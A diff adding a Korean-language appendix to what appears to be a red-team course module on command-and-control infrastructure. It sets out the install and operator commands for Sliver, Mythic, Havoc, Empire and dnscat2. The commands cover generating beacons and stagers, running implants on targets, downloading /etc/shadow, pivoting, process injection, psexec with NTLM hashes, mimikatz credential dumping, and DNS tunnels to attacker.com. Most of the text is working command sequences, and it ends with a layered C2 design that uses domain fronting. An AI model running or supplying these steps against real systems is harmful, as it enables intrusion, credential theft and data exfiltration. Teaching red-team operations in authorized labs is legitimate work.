@@ -787,3 +787,358 @@ graph LR
 
 **학생 액션**: C# AMSI bypass.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 07 C2 인프라)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | Sliver (Go, modern) | sliver |
+| s2 | Mythic (multi-platform) | Mythic |
+| s3 | Havoc (newer) | Havoc |
+| s4 | Empire (PowerShell) | Empire |
+| s5 | Metasploit handler | metasploit |
+| s6 | dnscat2 (DNS C2) | dnscat2 |
+| s7 | Brute Ratel (commercial) | (참고) |
+| s8 | Cobalt Strike alts | Sliver / Mythic |
+
+### 학생 환경 준비
+
+```bash
+# === Sliver (가장 OSS 표준) ===
+curl https://sliver.sh/install | sudo bash
+# 또는:
+go install github.com/bishopfox/sliver@latest
+
+# === Mythic (multi-platform framework) ===
+git clone https://github.com/MythicMeta/Mythic --recursive ~/mythic
+cd ~/mythic && sudo ./mythic-cli install -f
+
+# === Havoc (modern) ===
+git clone https://github.com/HavocFramework/Havoc ~/havoc
+cd ~/havoc/teamserver && make
+cd ~/havoc/client && make ts-build                         # Qt client
+
+# === Empire (PowerShell C2, BC Security) ===
+git clone --recursive https://github.com/BC-SECURITY/Empire ~/empire
+
+# === pwncat-cs (modern netcat replacement) ===
+pip install pwncat-cs
+
+# === dnscat2 (DNS C2) ===
+git clone https://github.com/iagox86/dnscat2 ~/dnscat2
+cd ~/dnscat2/server && bundle install
+cd ~/dnscat2/client && make
+```
+
+### Sliver — production-grade C2 (가장 표준)
+
+```bash
+# === 1. Server 시작 ===
+sliver-server                                              # interactive
+# 또는 daemon:
+sliver-server daemon
+
+# === 2. Multi-player (다중 client) ===
+sliver > new-operator --name alice --lhost 192.168.0.112
+# alice.cfg 파일 생성 → 다른 머신에서 사용 가능
+
+# === 3. Listeners (5종) ===
+
+# 3-1) mTLS (인증서 검증, 가장 안전)
+sliver > mtls --lhost 192.168.0.112 --lport 443
+
+# 3-2) HTTPS
+sliver > https --lhost 192.168.0.112 --lport 443
+
+# 3-3) HTTP
+sliver > http --lhost 192.168.0.112 --lport 80
+
+# 3-4) DNS (가장 은닉)
+sliver > dns --domains attacker.com.,c2.attacker.com.
+
+# 3-5) Wireguard (가장 advanced — VPN-like)
+sliver > wg --lhost 192.168.0.112 --lport 51820
+
+# === 4. Implant 생성 ===
+
+# Beacon (간헐적 callback — APT 표준)
+sliver > generate beacon \
+    --mtls 192.168.0.112:443 \
+    --os linux \
+    --arch amd64 \
+    --evasion \
+    --beacon-jitter 30s \
+    --beacon-interval 5m \
+    --save /tmp/beacon
+
+# Session (지속 connection — handson testing)
+sliver > generate \
+    --mtls 192.168.0.112:443 \
+    --save /tmp/session
+
+# Format 옵션
+# --format exe    (Win)
+# --format shared (Linux .so / Win .dll)
+# --format shellcode (raw bytes — process injection)
+# --format service (Win service)
+
+# Multi-stage (stager + payload)
+sliver > generate stage-listener --tcp 192.168.0.112:8080
+sliver > generate --stager 192.168.0.112:8080 --save /tmp/stager
+
+# === 5. Implant 실행 (target 에서) ===
+chmod +x /tmp/beacon
+./beacon &
+
+# === 6. Server 측 — sessions ===
+sliver > sessions
+sliver > beacons
+
+# === 7. Session 사용 ===
+sliver > use 1                                             # session 1
+
+# Shell + execute
+sliver (target) > shell                                    # interactive PTY shell
+sliver (target) > execute -t 30 ls /etc                    # 30s timeout
+
+# 파일 시스템
+sliver (target) > ls
+sliver (target) > cat /etc/passwd
+sliver (target) > download /etc/shadow                     # → 자동 attacker 측
+sliver (target) > upload /tmp/payload /tmp/.systemd-helper
+
+# Network
+sliver (target) > netstat
+sliver (target) > ifconfig
+
+# Pivoting (다른 host 접근)
+sliver (target) > pivots tcp --bind 0.0.0.0 --port 9999    # TCP pivot
+sliver (target) > pivots smb --pipe-name secret-pipe       # SMB pivot
+
+sliver > generate beacon --tcp-pivot target:9999 --save /tmp/p2
+# 다음 implant 가 pivot 통해 callback
+
+# Process
+sliver (target) > ps
+sliver (target) > kill 1234
+sliver (target) > migrate 5678                             # Win — 다른 process 으로 이주
+sliver (target) > spawndll dll-path                        # Win DLL injection
+sliver (target) > execute-shellcode /tmp/shellcode.bin     # Win
+
+# Privesc
+sliver (target) > getuid
+sliver (target) > getsystem                                # Win — getsystem
+sliver (target) > runas user --password pwd                # Win runas
+
+# Lateral (Win)
+sliver (target) > psexec admin --hash ntlm-hash dest.local
+sliver (target) > impersonate user2
+
+# Port forward (attacker 측 접근 가능)
+sliver (target) > portfwd add --remote 22 --local 2222
+# attacker:
+ssh -p 2222 user@127.0.0.1                                 # target 의 22 포트로 SSH
+
+# Background
+sliver (target) > background
+sliver > kill 1                                            # session 종료
+```
+
+### Mythic — multi-platform (Apollo / Poseidon / Athena 등)
+
+```bash
+# === 1. 시작 ===
+cd ~/mythic
+sudo ./mythic-cli start
+
+# Web UI: https://localhost:7443
+# 기본 계정: mythic_admin / 콘솔 출력 password
+
+# === 2. Agent install (Web UI) ===
+# Agents → Install → 다운로드:
+# - Apollo (.NET, Win 전용 — 가장 성숙)
+# - Poseidon (Go, Linux/macOS — modern)
+# - Athena (.NET, modern Win)
+# - Medusa (Python, multi-OS — DLL injection 강력)
+# - Merlin (Go, HTTP/2)
+
+# === 3. C2 Profile install ===
+# C2 Profiles → Install:
+# - http (가장 단순)
+# - https
+# - dns
+# - websocket (실시간 양방향)
+# - smb (lateral movement, 내부망 only)
+# - tcp
+
+# === 4. Payload 생성 ===
+# Web UI → Create Payload:
+# - Agent: Apollo
+# - C2 Profile: http
+# - 자동 컴파일 → 다운로드
+
+# === 5. Operation ===
+# Web UI 에서 callback 받으면:
+# - Tasking (각 agent 에 명령)
+# - File browser
+# - Process tree
+# - Process injection
+# - Lateral movement
+```
+
+### Havoc — Cobalt Strike-like modern OSS
+
+```bash
+# === 1. Server 시작 ===
+cd ~/havoc
+./havoc server --profile profiles/havoc.yaotl
+
+# === 2. Client 연결 ===
+./havoc client                                             # Qt GUI
+# Connect to: 192.168.0.112:40056
+# Username: admin / Password: (havoc.yaotl 에서)
+
+# === 3. Listener ===
+# GUI 에서:
+# Listeners → New
+# - Type: HTTP / HTTPS / SMB
+# - Port: 443
+
+# === 4. Demon (implant) 생성 ===
+# Payload → Create
+# - Listener: HTTP
+# - Architecture: x64
+# - Format: Windows EXE / Shellcode
+
+# === 5. Sessions (Demon 활성) ===
+# Web 으로 callback 받으면:
+# - 각 Demon 별 interaction
+# - File browser, process tree
+# - BOF (Beacon Object File) 실행 — Cobalt Strike 호환
+```
+
+### Empire — PowerShell C2 (Win/AD 환경)
+
+```bash
+# === 1. 시작 ===
+cd ~/empire
+sudo ./ps-empire server &                                  # server
+sudo ./ps-empire client                                    # client
+
+# 또는 Web UI:
+# http://localhost:1337
+
+# === 2. Listener ===
+(Empire) > listeners
+(Empire) > uselistener http
+(Empire/listeners/http) > set Host http://192.168.0.112:80
+(Empire/listeners/http) > set Port 80
+(Empire/listeners/http) > execute
+
+# === 3. Stager (다양한 형식) ===
+(Empire) > usestager multi/launcher
+(Empire/stager/multi/launcher) > set Listener http
+(Empire/stager/multi/launcher) > generate
+
+# 출력:
+# powershell -W h -nop -enc <base64>
+# 이걸 email/USB 으로 전달 → target 에서 실행
+
+# === 4. Agent 사용 ===
+(Empire) > agents
+(Empire) > interact <agent-name>
+(Empire/<agent>) > shell whoami
+(Empire/<agent>) > usemodule credentials/mimikatz/logonpasswords
+(Empire/<agent>) > execute
+
+# === 5. PowerShell Module ===
+# Empire 에 50+ PowerShell module:
+# - credentials/mimikatz/*
+# - lateral_movement/*
+# - persistence/*
+# - exfiltration/*
+# - situational_awareness/*
+```
+
+### dnscat2 (DNS C2)
+
+```bash
+# === 1. Server (attacker — NS 도메인 필요) ===
+cd ~/dnscat2/server
+ruby dnscat2.rb attacker.com \
+    --secret=mysecret
+
+# 출력:
+# Listening on 0.0.0.0:53
+# 모든 DNS query 가 attacker 에 도달
+
+# === 2. Client (target) ===
+~/dnscat2/client/dnscat \
+    --secret=mysecret \
+    attacker.com
+
+# === 3. Server 측 — sessions ===
+dnscat2> sessions
+
+# === 4. Session interaction ===
+dnscat2> session -i 1
+session 1> shell                                           # new shell window
+new windows... (#1)
+
+session 1> window -i 1
+shell #1> ls
+shell #1> cat /etc/passwd
+
+# === 5. 파일 전송 (DNS 으로 — 매우 느림) ===
+shell #1> upload /tmp/local-file /tmp/remote
+shell #1> download /etc/shadow /tmp/local-shadow
+
+# === 6. Tunnel ===
+session 1> tunnel 0.0.0.0:8080 internal-host:80
+# attacker 의 localhost:8080 → target 통해 internal-host:80
+```
+
+### C2 Framework 비교
+
+| 도구 | 언어 | 강점 | 약점 | 사용처 |
+|------|------|------|------|--------|
+| **Sliver** | Go | OSS 표준, multi-platform | Win 환경 특화 약함 | 사실상 표준 (대부분 시나리오) |
+| **Mythic** | Python + Go | Multi-agent framework, 풍부한 agents | 설정 복잡 | 다중 OS APT |
+| **Havoc** | C++ | Cobalt Strike-like, BOF 지원 | 미성숙, Win 위주 | Win red team |
+| **Empire** | PowerShell | Win/AD 강력, 50+ module | Win 한정, 시그니처 검출 쉬움 | AD 환경 |
+| **Metasploit** | Ruby | 전통적, 풍부한 modules | 시그니처 검출 쉬움 | 학습 / 빠른 PoC |
+| **pwncat-cs** | Python | netcat replacement, 간단 | 단순 | Lab / CTF |
+| **dnscat2** | Ruby/C | DNS-only 환경 | 매우 느림, NS 필요 | DNS-only 격리망 |
+
+### Beacon vs Session (Sliver)
+
+| 특성 | Beacon | Session |
+|------|--------|---------|
+| Callback 주기 | 간헐적 (5분~1시간) | 지속 (실시간) |
+| OPSEC | 우수 (탐지 어려움) | 약함 (long-lived TCP) |
+| 명령 응답 | 다음 callback 까지 대기 | 즉시 |
+| 사용 | APT (long-term) | Hands-on testing |
+| Detection | 어려움 (jitter) | TCP keepalive 패턴 |
+| 권장 | Production | Lab |
+
+### 통합 C2 인프라 — 실전 권장 구성
+
+```
+┌─ DNS (5종 분산 도메인) — dnscat2 + sliver dns
+│   가장 stealth, 매우 느림
+│   ↓ fall through
+├─ HTTPS (CDN 으로 도메인 fronting) — sliver / Mythic
+│   중간 stealth, 적정 속도
+│   ↓ fall through
+├─ mTLS (자체 cert) — sliver
+│   강한 격리, OPSEC 우수
+│   ↓ 마지막 fall back
+└─ HTTP (80 만 허용) — sliver / Mythic
+    가장 흔함, 가장 약함
+```
+
+학생은 본 7주차에서 **Sliver + Mythic + Havoc + Empire + Metasploit + pwncat-cs + dnscat2** 7 C2 framework 의 advanced 운영 (multi-listener / beacon 패턴 / pivoting / 다중 OS) 을 OSS 만으로 익힌다.
